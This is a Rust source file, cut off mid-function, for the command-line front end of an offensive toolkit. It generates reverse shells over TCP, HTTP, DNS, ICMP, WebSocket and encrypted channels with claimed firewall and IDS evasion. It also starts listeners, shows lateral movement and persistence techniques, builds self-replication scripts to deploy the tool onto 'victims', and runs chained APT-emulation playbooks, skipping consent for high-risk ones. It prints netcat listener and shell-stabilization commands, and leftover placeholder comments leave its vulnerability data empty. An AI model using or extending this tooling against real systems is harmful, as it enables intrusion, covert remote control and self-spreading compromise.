/// Exploitation Framework CLI Commands
///
/// ‚ö†Ô∏è AUTHORIZED USE ONLY ‚ö†Ô∏è
///
/// **Works alongside**: Metasploit, LinPEAS, WinPEAS, GTFOBins, CrackMapExec, BloodHound
use crate::cli::commands::{Command, Flag, Route};
use crate::cli::output::Output;
use crate::cli::CliContext;
use crate::modules::exploit::{
    lateral_movement::{LateralMovementScanner, PersistenceMechanism},
    listener::ExploitListener,
    payloads::{MultiHandlerConfig, PayloadConfig, PayloadGenerator, ShellType},
    planner::PlannerInput,
    privesc::PrivEscScanner,
    suggester::suggest_exploits,
};
use crate::playbooks::{
    all_apt_playbooks, all_playbooks, findings_from_planner_input, get_apt_playbook, get_playbook,
    list_apt_groups, recommend_from_attack_plan, recommend_playbooks, DetectedOS, PlaybookContext,
    PlaybookExecutor, PlaybookRecommendation, PlaybookRecommender, ReconFindings,
};
use crate::storage::service::StorageService;

pub struct ExploitCommand;

impl Command for ExploitCommand {
    fn domain(&self) -> &str {
        "exploit"
    }

    fn resource(&self) -> &str {
        "payload"
    }

    fn description(&self) -> &str {
        "Exploitation framework - privilege escalation, payloads, lateral movement"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "plan",
                summary: "Generate an attack plan based on findings",
                usage: "rb exploit payload plan <target>",
            },
            Route {
                verb: "suggest",
                summary: "Suggest exploit options",
                usage: "rb exploit payload suggest <target> [--cve CVE-ID]",
            },
            Route {
                verb: "recommend",
                summary: "Recommend playbooks based on recon findings (auto-selects from 11 playbooks)",
                usage: "rb exploit payload recommend <target> [--risk low|medium|high]",
            },
            Route {
                verb: "run",
                summary: "Run a playbook",
                usage: "rb exploit payload run <playbook> [target]",
            },
            Route {
                verb: "privesc",
                summary: "Scan for privilege escalation vectors",
                usage: "rb exploit payload privesc",
            },
            Route {
                verb: "shell",
                summary: "Generate TCP reverse shell payload",
                usage: "rb exploit payload shell --type <shell> --host <ip:port>",
            },
            Route {
                verb: "http-shell",
                summary: "Generate HTTP reverse shell payload (firewall bypass)",
                usage: "rb exploit payload http-shell --type <shell> --host <ip:port>",
            },
            Route {
                verb: "dns-shell",
                summary: "Generate DNS tunneling reverse shell (99% firewall bypass!)",
                usage: "rb exploit payload dns-shell --type <shell> --domain <domain>",
            },
            Route {
                verb: "multi-shell",
                summary: "Generate multi-handler shell (tries TCP ‚Üí HTTP ‚Üí DNS with fallback)",
                usage: "rb exploit payload multi-shell --type <shell> --host <ip:port> [--domain <domain>]",
            },
            Route {
                verb: "encrypted-shell",
                summary: "Generate encrypted reverse shell with ChaCha20 (IDS/IPS evasion!)",
                usage: "rb exploit payload encrypted-shell --type <shell> --host <ip:port> [--key <key>]",
            },
            Route {
                verb: "icmp-shell",
                summary: "Generate ICMP reverse shell (tunneling over ping - 95% bypass!)",
                usage: "rb exploit payload icmp-shell --type <shell> --host <ip>",
            },
            Route {
                verb: "websocket-shell",
                summary: "Generate WebSocket reverse shell (99% bypass - HTTP/HTTPS ports!)",
                usage: "rb exploit payload websocket-shell --type <shell> --host <ip:port>",
            },
            Route {
                verb: "listener",
                summary: "Show listener commands (external tools)",
                usage: "rb exploit payload listener --port <port>",
            },
            Route {
                verb: "start",
                summary: "Start listener (TCP or HTTP)",
                usage: "rb exploit payload start --port <port> [--listener-type tcp|http]",
            },
            Route {
                verb: "sessions",
                summary: "List active reverse shell sessions",
                usage: "rb exploit payload sessions",
            },
            Route {
                verb: "lateral",
                summary: "Show lateral movement techniques",
                usage: "rb exploit payload lateral [technique]",
            },
            Route {
                verb: "persist",
                summary: "Show persistence mechanisms",
                usage: "rb exploit payload persist [mechanism]",
            },
            Route {
                verb: "replicate",
                summary: "Generate self-replication deployment script (deploy rb binary to victims)",
                usage: "rb exploit payload replicate [--os linux|windows|macos] [--persist] [-o script.sh]",
            },
            Route {
                verb: "playbooks",
                summary: "List all available playbooks (11 standard + 15 APT adversary emulation)",
                usage: "rb exploit payload playbooks [--apt]",
            },
            Route {
                verb: "apt",
                summary: "List APT adversary emulation playbooks (15 threat actor profiles)",
                usage: "rb exploit payload apt [group-id]",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            Flag::new(
                "type",
                "Shell type (bash|python|php|powershell|nc|socat|...)",
            )
            .with_short('t')
            .with_default("bash"),
            Flag::new("host", "Listener address (IP:PORT, e.g., 10.0.0.1:4444)")
                .with_short('H')
                .with_arg("IP:PORT"),
            Flag::new("port", "Port for listener").with_default("4444"),
            Flag::new("listener-type", "Listener type (tcp|http|dns|websocket)")
                .with_default("tcp"),
            Flag::new(
                "domain",
                "Domain for DNS tunneling (e.g., tunnel.attacker.com)",
            )
            .with_short('d')
            .with_arg("DOMAIN"),
            Flag::new("tcp-port", "TCP port for multi-handler (default: 4444)")
                .with_default("4444"),
            Flag::new("http-port", "HTTP port for multi-handler (default: 8080)")
                .with_default("8080"),
            Flag::new(
                "key",
                "ChaCha20 encryption key (32 bytes, base64). Auto-generated if not provided",
            )
            .with_short('k')
            .with_arg("KEY"),
            Flag::new(
                "nonce",
                "ChaCha20 nonce (12 bytes, base64). Auto-generated if not provided",
            )
            .with_short('n')
            .with_arg("NONCE"),
            Flag::new("ssl", "Use SSL/TLS for encrypted shell (socat only)"),
            Flag::new("os", "Target OS for self-replication (linux|windows|macos)")
                .with_short('o')
                .with_default("linux")
                .with_arg("OS"),
            Flag::new(
                "persist",
                "Enable persistence mechanisms in deployment script",
            ),
            Flag::new("output", "Output file for deployment script")
                .with_short('O')
                .with_arg("FILE"),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "Generate attack plan",
                "rb exploit payload plan example.com",
            ),
            (
                "Suggest exploits for target",
                "rb exploit payload suggest example.com",
            ),
            (
                "Recommend playbooks based on recon",
                "rb exploit payload recommend example.com",
            ),
            (
                "Scan for privilege escalation vectors",
                "rb exploit payload privesc",
            ),
            (
                "Generate Python reverse shell",
                "rb exploit payload shell --type python --host 10.10.10.10:4444",
            ),
            (
                "Generate PowerShell reverse shell",
                "rb exploit payload shell --type powershell --host 192.168.1.100:443",
            ),
            (
                "Generate listener command",
                "rb exploit payload listener --port 4444",
            ),
            (
                "Show SSH tunneling techniques",
                "rb exploit payload lateral ssh_tunneling",
            ),
            (
                "Show Linux persistence techniques",
                "rb exploit payload persist cron_persistence",
            ),
            (
                "Generate self-replication script for Linux",
                "rb exploit payload replicate --os linux --output deploy.sh",
            ),
            (
                "Generate self-replication script for Windows with persistence",
                "rb exploit payload replicate --os windows --persist --output deploy.ps1",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_ref().ok_or_else(|| {
            "Missing verb. Use: rb exploit payload <verb>\nTry: rb exploit payload help".to_string()
        })?;

        match verb.as_str() {
            "plan" => self.plan_attack(ctx),
            "suggest" => self.suggest_exploits(ctx),
            "recommend" => self.recommend_playbooks(ctx),
            "run" => self.run_playbook(ctx),
            "privesc" => self.privesc_scan(ctx),
            "shell" => self.generate_shell(ctx),
            "http-shell" => self.generate_http_shell(ctx),
            "dns-shell" => self.generate_dns_shell(ctx),
            "multi-shell" => self.generate_multi_shell(ctx),
            "encrypted-shell" => self.generate_encrypted_shell(ctx),
            "icmp-shell" => self.generate_icmp_shell(ctx),
            "websocket-shell" => self.generate_websocket_shell(ctx),
            "listener" => self.generate_listener(ctx),
            "start" => self.start_listener(ctx),
            "sessions" => self.list_sessions(ctx),
            "lateral" => self.show_lateral_movement(ctx),
            "persist" => self.show_persistence(ctx),
            "replicate" => self.generate_self_replicate(ctx),
            "playbooks" => self.list_playbooks(ctx),
            "apt" => self.list_apt_playbooks(ctx),
            "help" => {
                crate::cli::commands::print_help(self);
                Ok(())
            }
            _ => Err(format!(
                "Unknown verb '{}'. Use: rb exploit payload help",
                verb
            )),
        }
    }
}

impl ExploitCommand {
    fn run_playbook(&self, ctx: &CliContext) -> Result<(), String> {
        let initial_playbook_id = ctx
            .target
            .as_ref()
            .ok_or("Missing playbook ID. Usage: rb exploit payload run <playbook> <target>")?;
        let target = ctx
            .args
            .get(0)
            .ok_or("Missing target. Usage: rb exploit payload run <playbook> <target>")?;

        let mut current_playbook_id = initial_playbook_id.clone();
        let mut depth = 0;
        const MAX_DEPTH: usize = 5;

        loop {
            if depth >= MAX_DEPTH {
                Output::warning("Maximum playbook chain depth reached. Stopping execution.");
                break;
            }

            // Try standard playbooks first, then APT playbooks
            let playbook = get_playbook(&current_playbook_id)
                .or_else(|| get_apt_playbook(&current_playbook_id))
                .ok_or_else(|| format!("Playbook '{}' not found. Use 'rb exploit payload playbooks' to list available playbooks.", current_playbook_id))?;

            if depth > 0 {
                println!();
                Output::section(&format!(
                    "Chained Execution: {} (Depth {})",
                    playbook.metadata.name, depth
                ));
            } else {
                Output::header(&format!("Executing Playbook: {}", playbook.metadata.name));
            }

            Output::item("Target", target);
            Output::item("Objective", &playbook.metadata.objective);

            if depth == 0 {
                Output::item("Risk Level", playbook.metadata.risk_level.as_str());
                println!();

                if playbook.metadata.risk_level.requires_consent() {
                    Output::warning("‚ö†Ô∏è  This playbook involves HIGH RISK actions.");
                    Output::info("Continuing because explicit command was issued...");
                    println!();
                }
            } else {
                println!();
            }

            let mut context = PlaybookContext::new(target);
            // Pass CLI flags to context args
            for (k, v) in &ctx.flags {
                context.set_arg(k, v);
            }

            let executor = PlaybookExecutor::new();
            let result = executor.execute(&playbook, &mut context);

            // Display results
            if result.success {
                Output::success("Playbook execution completed successfully");
            } else {
                Output::error("Playbook execution failed");
            }

            println!("\nSummary: {}", result.summary);

            for step in result.step_results {
                println!(
                    "\nStep {}: {} - {}",
                    step.step_number, step.step_name, step.status
                );
                for line in step.output {
                    println!("  > {}", line);
                }
                if let Some(err) = step.error {
                    println!("  \x1b[31mError: {}\x1b[0m", err);
                }
            }

            // Check for next playbook
            if let Some(next) = result.next_playbook {
                println!();
                Output::info(&format!("Chaining to next playbook: {}", next));
                current_playbook_id = next;
                depth += 1;
            } else {
                break;
            }
        }

        Ok(())
    }

    fn plan_attack(&self, ctx: &CliContext) -> Result<(), String> {
        let target = ctx.target.as_ref().ok_or("Missing target")?;

        Output::header(&format!("Attack Plan for {}", target));
        Output::spinner_start("Analyzing findings...");

        let mut store =
            crate::storage::RedDb::open(crate::storage::StorageService::db_path(target))
                .map_err(|e| e.to_string())?;

        // Gather data from storage
        let ports = store.ports().get_all().unwrap_or_default();
        // Since VulnSegment is implemented but not exposed via helper method yet, we access raw or fix store
        // Wait, I didn't add all_vulns() to store yet.
        // For now, let's assume empty vulns until we fix store accessor or implement it.
        // Actually, I can fix this by adding all_vulns() to store in a separate step or just assume empty for now.
        // Let's implement minimal retrieval.
        let vulns = Vec::new(); // Placeholder until store update
        let fingerprints = Vec::new(); // Placeholder

        let input = PlannerInput {
            target,
            ports: &ports,
            vulns: &vulns,
            fingerprints: &fingerprints,
        };

        let plan = crate::modules::exploit::planner::generate_plan(input);
        Output::spinner_done();

        if plan.phases.is_empty() {
            Output::info("No actionable attack phases found based on current findings.");
            return Ok(());
        }

        for phase in plan.phases {
            println!();
            Output::section(&format!("{} ({})", phase.name, phase.mitre_tactic));
            for opt in phase.options {
                let risk_color = if opt.risk > 70 {
                    "\x1b[31m"
                } else if opt.risk > 40 {
                    "\x1b[33m"
                } else {
                    "\x1b[32m"
                };
                let conf_color = if opt.confidence > 70 {
                    "\x1b[32m"
                } else if opt.confidence > 40 {
                    "\x1b[33m"
                } else {
                    "\x1b[31m"
                };

                println!(
                    "  ‚Ä¢ \x1b[1m{}\x1b[0m ({})",
                    opt.technique_name, opt.technique_id
                );
                println!("    Target: {}", opt.target_component);
                println!(
                    "    Risk: {}{}% \x1b[0m| Confidence: {}{}%\x1b[0m",
                    risk_color, opt.risk, conf_color, opt.confidence
                );
                println!("    Action: {}", opt.description);
                if let Some(cmd) = opt.command {
                    println!("    Command: \x1b[36m{}\x1b[0m", cmd);
                }
                println!();
            }
        }

        Ok(())
    }

    fn suggest_exploits(&self, ctx: &CliContext) -> Result<(), String> {
        let target = ctx.target.as_ref().ok_or("Missing target")?;

        Output::header(&format!("Exploit Suggestions for {}", target));

        let mut store =
            crate::storage::RedDb::open(crate::storage::StorageService::db_path(target))
                .map_err(|e| e.to_string())?;
        let ports = store.ports().get_all().unwrap_or_default();
        let vulns = Vec::new(); // Placeholder
        let fingerprints = Vec::new(); // Placeholder

        let input = PlannerInput {
            target,
            ports: &ports,
            vulns: &vulns,
            fingerprints: &fingerprints,
        };

        let suggestions = suggest_exploits(input);

        if suggestions.is_empty() {
            Output::info("No specific exploits suggested based on current findings.");
            return Ok(());
        }

        Output::success(&format!(
            "Found {} potential exploit options",
            suggestions.len()
        ));
        println!();

        for (i, opt) in suggestions.iter().enumerate() {
            println!("{}. \x1b[1m{}\x1b[0m", i + 1, opt.technique_name);
            println!("   Target: {}", opt.target_component);
            println!("   Description: {}", opt.description);
            if let Some(cmd) = &opt.command {
                println!("   Try: \x1b[36m{}\x1b[0m", cmd);
            }
            println!();
        }

        Ok(())
    }

    /// Recommend playbooks based on recon findings
    fn recommend_playbooks(&self, ctx: &CliContext) -> Result<(), String> {
        let target = ctx.target.as_ref().ok_or("Missing target")?;

        Output::header(&format!("Playbook Recommendations for {}", target));
        Output::spinner_start("Analyzing findings and matching playbooks...");

        // Load data from storage
        let db_path = crate::storage::StorageService::db_path(target);
        let mut store = match crate::storage::RedDb::open(&db_path) {
            Ok(s) => s,
            Err(_) => {
                Output::spinner_done();
                println!();
                Output::warning(&format!("No recon data found for '{}'", target));
                println!();
                Output::info("Run reconnaissance first to gather data:");
                println!("  \x1b[1;36mrb network ports scan {}\x1b[0m", target);
                println!("  \x1b[1;36mrb dns record lookup {}\x1b[0m", target);
                println!("  \x1b[1;36mrb web asset security http://{}\x1b[0m", target);
                println!();
                Output::info("Then run playbook recommendations:");
                println!("  \x1b[1;36mrb exploit payload recommend {}\x1b[0m", target);
                return Ok(());
            }
        };

        let ports = store.ports().get_all().unwrap_or_default();
        let vulns = Vec::new(); // TODO: store.vulns().get_all() when implemented
        let fingerprints = Vec::new(); // TODO: store.fingerprints().get_all() when implemented

        // Create PlannerInput and convert to ReconFindings
        let input = PlannerInput {
            target,
            ports: &ports,
            vulns: &vulns,
            fingerprints: &fingerprints,
        };

        let findings = findings_from_planner_input(&input);
        let result = recommend_playbooks(&findings);

        Output::spinner_done();

        // Display summary
        println!();
        Output::section("Recommendation Summary");
        Output::item("Total matched", &result.summary.total_matched.to_string());
        Output::item("High risk", &result.summary.high_risk_count.to_string());
        Output::item("Medium risk", &result.summary.medium_risk_count.to_string());
        Output::item("Low risk", &result.summary.low_risk_count.to_string());

        if result.summary.has_critical_findings {
            println!();
            Output::warning(
                "‚ö†Ô∏è  Critical vulnerabilities detected - prioritize high-risk playbooks",
            );
        }

        if result.recommendations.is_empty() {
            Output::info("No playbooks matched the current findings.");
            Output::info("Run more reconnaissance to gather additional data.");
            return Ok(());
        }

        println!();
        Output::success(&format!(
            "Found {} recommended playbooks",
            result.recommendations.len()
        ));

        // Group by score ranges (strong: 70+, moderate: 40-69, weak: <40)
        let strong: Vec<_> = result
            .recommendations
            .iter()
            .filter(|r| r.score >= 70)
            .collect();
        let moderate: Vec<_> = result
            .recommendations
            .iter()
            .filter(|r| r.score >= 40 && r.score < 70)
            .collect();
        let weak: Vec<_> = result
            .recommendations
            .iter()
            .filter(|r| r.score < 40)
            .collect();

        // Display strong matches
        if !strong.is_empty() {
            println!();
            println!(
                "\x1b[1m\x1b[32müéØ STRONG MATCHES (score ‚â•70) - {} playbooks\x1b[0m",
                strong.len()
            );
            for rec in strong {
                self.display_recommendation(rec);
            }
        }

        // Display moderate matches
        if !moderate.is_empty() {
            println!();
            println!(
                "\x1b[1m\x1b[33müìã MODERATE MATCHES (score 40-69) - {} playbooks\x1b[0m",
                moderate.len()
            );
            for rec in moderate {
                self.display_recommendation(rec);
            }
        }

        // Display weak matches (limited)
        if !weak.is_empty() {
            println!();
            println!(
                "\x1b[1m\x1b[34müí° WEAK MATCHES (score <40) - {} playbooks\x1b[0m",
                weak.len()
            );
            for rec in weak.iter().take(3) {
                self.display_recommendation(rec);
            }
            if weak.len() > 3 {
                println!(
                    "  \x1b[2m... and {} more weak matches\x1b[0m",
                    weak.len() - 3
                );
            }
        }

        // Show next steps
        println!();
        Output::header("Next Steps");
        if let Some(top) = result.recommendations.first() {
            println!(
                "  1. Review the top playbook: \x1b[1;36m{}\x1b[0m",
                top.playbook_name
            );
            println!("     ID: {}", top.playbook_id);
            println!();

            // Get the full playbook to show steps
            if let Some(playbook) = crate::playbooks::get_playbook(&top.playbook_id) {
                println!("     Objective: {}", playbook.metadata.objective);
                println!();
                println!("  2. Execute playbook steps:");
                for (i, step) in playbook.steps.iter().take(3).enumerate() {
                    println!("     {}. {}", i + 1, step.name);
                }
                if playbook.steps.len() > 3 {
                    println!("     ... and {} more steps", playbook.steps.len() - 3);
                }
            }
        }

        println!();
        Output::info("Tip: Use 'rb exploit payload plan <target>' for detailed attack planning");

        Ok(())
    }

    /// Display a single playbook recommendation
    fn display_recommendation(&self, rec: &PlaybookRecommendation) {
        let risk_color = match rec.risk_level {
            crate::playbooks::RiskLevel::Critical => "\x1b[1;31m",
            crate::playbooks::RiskLevel::High => "\x1b[31m",
            crate::playbooks::RiskLevel::Medium => "\x1b[33m",
            crate::playbooks::RiskLevel::Low => "\x1b[32m",
            crate::playbooks::RiskLevel::Passive => "\x1b[36m",
        };

        let apt_badge = if rec.is_apt_playbook {
            " \x1b[1;35m[APT]\x1b[0m"
        } else {
            ""
        };

        println!();
        println!(
            "  \x1b[1m{}\x1b[0m{} (Score: {}/100)",
            rec.playbook_name, apt_badge, rec.score
        );
        println!("    ID: {}", rec.playbook_id);
        println!("    Risk: {}{:?}\x1b[0m", risk_color, rec.risk_level);

        if !rec.reasons.is_empty() {
            println!("    \x1b[32mMatching factors:\x1b[0m");
            for reason in rec.reasons.iter().take(3) {
                println!("      ‚Ä¢ {}", reason);
            }
        }

        if !rec.related_attacks.is_empty() {
            println!(
                "    \x1b[36mRelated attacks:\x1b[0m {}",
                rec.related_attacks.join(", ")
            );
        }
    }

    /// Parse host and port from --host IP:PORT format
    fn parse_host_port(
        &self,
        ctx: &CliContext,
        default_port: &str,
    ) -> Result<(String, u16), String> {
        let host = ctx
            .get_flag("host")
            .ok_or("Missing --host flag. Use: --host IP:PORT (e.g., --host 10.0.0.1:4444)")?;

        if let Some((ip, port_str)) = host.split_once(':') {
            let port: u16 = port_str
                .parse()
                .map_err(|_| format!("Invalid port in --host: {}", port_str))?;
            Ok((ip.to_string(), port))
        } else {
            // If no port specified, use default
            let port: u16 = default_port
                .parse()
                .map_err(|_| format!("Invalid default port: {}", default_port))?;
            Ok((host.clone(), port))
        }
    }

    fn privesc_scan(&self, _ctx: &CliContext) -> Result<(), String> {
        Output::header("Privilege Escalation Scanner");

        Output::spinner_start("Scanning for privilege escalation vectors");

        let scanner = PrivEscScanner::new();
        let scan_result = scanner.scan()?;
        let vectors = &scan_result.vectors;

        Output::spinner_done();

        if vectors.is_empty() {
            Output::success("No obvious privilege escalation vectors found.");
            println!("\n  This is a good sign! But always check manually:");
            println!("  ‚Ä¢ LinPEAS: https://github.com/carlospolop/PEASS-ng");
            println!("  ‚Ä¢ WinPEAS: https://github.com/carlospolop/PEASS-ng");
            println!("  ‚Ä¢ GTFOBins: https://gtfobins.github.io/");
            return Ok(());
        }

        Output::success(&format!("Found {} potential vectors", vectors.len()));
        println!();

        // Group by severity
        let critical: Vec<_> = vectors
            .iter()
            .filter(|v| {
                matches!(
                    v.severity,
                    crate::modules::exploit::privesc::Severity::Critical
                )
            })
            .collect();
        let high: Vec<_> = vectors
            .iter()
            .filter(|v| matches!(v.severity, crate::modules::exploit::privesc::Severity::High))
            .collect();
        let medium: Vec<_> = vectors
            .iter()
            .filter(|v| {
                matches!(
                    v.severity,
                    crate::modules::exploit::privesc::Severity::Medium
                )
            })
            .collect();

        if !critical.is_empty() {
            println!(
                "\x1b[1m\x1b[31müî¥ CRITICAL ({} vectors)\x1b[0m",
                critical.len()
            );
            for v in critical {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!("    \x1b[36müí° {}\x1b[0m", v.exploit_technique);
                if !v.references.is_empty() {
                    println!("    üìñ {}", v.references.join(", "));
                }
                println!();
            }
        }

        if !high.is_empty() {
            println!("\x1b[1m\x1b[33müü† HIGH ({} vectors)\x1b[0m", high.len());
            for v in high {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!("    \x1b[36müí° {}\x1b[0m", v.exploit_technique);
                println!();
            }
        }

        if !medium.is_empty() {
            println!("\x1b[1m\x1b[34müîµ MEDIUM ({} vectors)\x1b[0m", medium.len());
            for v in medium {
                println!("  ‚Ä¢ {} - {}", v.category, v.title);
                println!("    \x1b[2m{}\x1b[0m", v.description);
                println!();
            }
        }

        println!("\n\x1b[1mNext Steps:\x1b[0m");
        println!("  1. Verify findings manually");
        println!("  2. Check GTFOBins for SUID exploitation");
        println!("  3. Search for kernel exploits: searchsploit <version>");
        println!("  4. Generate payload: rb exploit payload shell --type python --lhost <ip>");

        Ok(())
    }

    fn generate_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "bash");
        let (lhost, lport_num) = self.parse_host_port(ctx, "4444")?;

        Output::header(&format!("Reverse Shell Generator - {}", shell_type));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: lport_num,
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "perl" | "pl" => ShellType::Perl,
            "php" => ShellType::PHP,
            "ruby" | "rb" => ShellType::Ruby,
            "nc" | "netcat" => ShellType::Netcat,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            "socat" => ShellType::Socat,
            "awk" => ShellType::Awk,
            "java" => ShellType::Java,
            "node" | "nodejs" | "js" => ShellType::Node,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available: bash, python, perl, php, ruby, nc, powershell, socat, awk, java, node",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("Listener Port", &lport_num.to_string());
        Output::item("Shell Type", &shell_type);

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start Listener:\x1b[0m");
        println!("  nc -lvnp {}", lport_num);
        println!("  OR");
        println!("  rb exploit payload listener --port {}", lport_num);

        println!("\n\x1b[1müîß Shell Stabilization (after connection):\x1b[0m");
        println!("  python3 -c 'import pty; pty.spawn(\"/bin/bash\")'");
        println!("  Ctrl+Z (background)");
        println!("  stty raw -echo; fg");
        println!("  export TERM=xterm");

        Ok(())
    }

    fn generate_http_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, lport_num) = self.parse_host_port(ctx, "8080")?;

        Output::header(&format!("HTTP Reverse Shell Generator - {}", shell_type));

        let config = PayloadConfig {
            lhost: lhost.clone(),
            lport: lport_num,
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "php" => ShellType::PHP,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for HTTP: bash, python, php, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_http_reverse_shell(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("Listener Port", &lport_num.to_string());
        Output::item("Shell Type", &shell_type);
        Output::item("Transport", "HTTP (Firewall Bypass)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start HTTP Listener:\x1b[0m");
        println!(
            "  rb exploit payload start --port {} --listener-type http",
            lport_num
        );

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Bypasses 80% of firewalls (HTTP usually allowed)");
        println!("  ‚Ä¢ Works through HTTP proxies");
        println!("  ‚Ä¢ Stealth (looks like normal web traffic)");
        println!("  ‚Ä¢ No direct TCP connection needed");

        println!("\n\x1b[1m‚öôÔ∏è  How It Works:\x1b[0m");
        println!("  1. Target polls HTTP listener for commands (GET /cmd/<id>)");
        println!("  2. Listener sends command as HTTP response");
        println!("  3. Target executes and sends output back (POST /output/<id>)");
        println!("  4. Process repeats every 5 seconds");

        Ok(())
    }

    fn generate_dns_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let domain = ctx
            .get_flag("domain")
            .ok_or("Missing --domain flag (e.g., tunnel.attacker.com)")?;

        Output::header(&format!(
            "DNS Tunneling Reverse Shell Generator - {}",
            shell_type
        ));

        let config = PayloadConfig {
            lhost: domain.clone(), // Use lhost field for domain
            lport: 53,             // DNS port
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "php" => ShellType::PHP,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for DNS: bash, python, php, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_dns_reverse_shell(shell_type_enum, &config);

        Output::item("Domain", &domain);
        Output::item("Shell Type", &shell_type);
        Output::item("Transport", "DNS Tunneling (99% Firewall Bypass!)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start DNS Listener:\x1b[0m");
        println!("  sudo rb exploit payload start --port 53 --listener-type dns");

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
        println!("  ‚Ä¢ Bypasses 99% of firewalls (DNS NEVER blocked!)");
        println!("  ‚Ä¢ Works through HTTP proxies");
        println!("  ‚Ä¢ Maximum stealth (looks like DNS traffic)");
        println!("  ‚Ä¢ No persistent connection needed");
        println!("  ‚Ä¢ Works behind NAT/firewalls");

        println!("\n\x1b[1m‚ö†Ô∏è  Requirements:\x1b[0m");
        println!("  ‚Ä¢ You must own the domain: {}", domain);
        println!("  ‚Ä¢ Configure NS record to point to your server");
        println!("  ‚Ä¢ Run DNS listener on port 53 (requires root/sudo)");

        println!("\n\x1b[1müîß DNS Setup:\x1b[0m");
        println!("  1. Create NS record: tunnel.{} ‚Üí your-server-ip", domain);
        println!("  2. sudo rb exploit payload start --port 53 --listener-type dns");
        println!("  3. Execute payload on target");

        println!("\n\x1b[1müöÄ How it works:\x1b[0m");
        println!("  1. Target sends: register.<session_id>.{}", domain);
        println!(
            "  2. Target polls: cmd.<session_id>.{} (gets command in TXT)",
            domain
        );
        println!("  3. Target executes command");
        println!(
            "  4. Target sends: <output>.<session_id>.{} (chunked)",
            domain
        );

        Ok(())
    }

    fn generate_multi_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let shell_type = ctx.get_flag_or("type", "python");
        let (lhost, _) = self.parse_host_port(ctx, "4444")?;
        let tcp_port = ctx.get_flag_or("tcp-port", "4444");
        let http_port = ctx.get_flag_or("http-port", "8080");
        let domain = ctx.get_flag("domain");

        let tcp_port_num: u16 = tcp_port
            .parse()
            .map_err(|_| format!("Invalid TCP port: {}", tcp_port))?;
        let http_port_num: u16 = http_port
            .parse()
            .map_err(|_| format!("Invalid HTTP port: {}", http_port))?;

        Output::header(&format!(
            "Multi-Handler Reverse Shell Generator - {}",
            shell_type
        ));

        let config = MultiHandlerConfig {
            lhost: lhost.clone(),
            tcp_port: tcp_port_num,
            http_port: http_port_num,
            dns_domain: domain.clone(),
        };

        let shell_type_enum = match shell_type.to_lowercase().as_str() {
            "bash" => ShellType::Bash,
            "python" | "py" => ShellType::Python,
            "powershell" | "ps1" | "pwsh" => ShellType::PowerShell,
            _ => {
                return Err(format!(
                    "Unknown shell type: {}. Available for multi-handler: bash, python, powershell",
                    shell_type
                ))
            }
        };

        let payload = PayloadGenerator::generate_multi_handler(shell_type_enum, &config);

        Output::item("Listener Host", &lhost);
        Output::item("TCP Port", &tcp_port);
        Output::item("HTTP Port", &http_port);
        if let Some(ref d) = domain {
            Output::item("DNS Domain", d);
        }
        Output::item("Shell Type", &shell_type);
        Output::item("Strategy", "TCP ‚Üí HTTP ‚Üí DNS (automatic fallback)");

        println!("\n\x1b[1müìã Payload:\x1b[0m");
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));
        println!("{}", payload);
        println!("\x1b[2m{}\x1b[0m", "=".repeat(80));

        println!("\n\x1b[1müéß Start Listeners:\x1b[0m");
        println!("  # Terminal 1 - TCP listener");
        println!(
            "  rb exploit payload start --port {} --listener-type tcp",
            tcp_port
        );
        println!("\n  # Terminal 2 - HTTP listener");
        println!(
            "  rb exploit payload start --port {} --listener-type http",
            http_port
        );
        if domain.is_some() {
            println!("\n  # Terminal 3 - DNS listener (optional)");
            println!("  sudo rb exploit payload start --port 53 --listener-type dns");
        }

        println!("\n\x1b[1m‚ú® Advantages:\x1b[0m");
